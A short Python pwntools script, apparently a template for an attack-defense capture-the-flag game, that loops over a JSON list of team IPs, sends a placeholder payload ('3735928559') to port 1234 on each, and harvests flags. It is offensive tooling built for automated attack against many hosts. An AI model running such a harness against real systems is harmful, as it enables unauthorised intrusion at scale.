#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import json
from pwn import *
from flagger import get_flag

context.update(arch='i386')

port = 1234

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
file_data = open('team_ips.json', 'r').read()
teams = json.loads(file_data)
for team in teams:
    try:
        io = connect(team['ip'], port)

        # ADD PAYLOAD HERE
        payload = '3735928559'

        io.sendline(payload)
        flag = get_flag(io)
        if flag != -1:
            log.info('Flag %s', flag)
        else:
            log.info('Nope')
        io.close()
    except:
        log.info('Service down: %s', team['ip'])
        pass

